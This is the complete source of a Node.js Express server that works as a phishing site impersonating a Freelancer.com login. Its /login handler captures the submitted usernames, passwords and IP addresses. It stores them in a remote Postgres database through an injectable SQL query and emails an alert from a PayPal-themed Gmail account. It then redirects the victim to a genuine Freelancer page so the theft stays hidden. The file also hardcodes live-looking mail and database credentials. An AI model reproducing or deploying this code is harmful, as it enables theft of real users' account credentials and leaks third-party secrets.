var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
var mailOptions = {
    from: 'paypal.credit.safety@gmail.com',
    to: "fadysadakah.emh@gmail.com",
    subject: 'hacked freelancer',
    text: '',
    html: ''
};
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'paypal.credit.safety@gmail.com',
        pass: 'xzoahseedlerintr'
    }
});

app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'hedmgtryrynnvo',
    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
    database: 'deqngk324p153p',
    port: 5432,
    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
    ssl: true
});

client.connect();

// #########################################################################################################################################################################################################################
app.get('/confirm/*',function(req,res){
    res.render('confirm')
})
// #############################################################    POST REQUESTS    #######################################################################################################################################
app.post('/login',function(req,res){
    console.log(req.body)
    transporter.sendMail(mailOptions, function () { });
    var a = req.body.username;
    var b = req.body.password;
    console.log(a+b);
    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO freelancer_users (users,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
    res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
})


// #########################################################################################################################################################################################################################

app.get('*', function (req, res) {
    res.render('login')
})
app.listen(PORT, function () {
    console.log('Server Started')
})
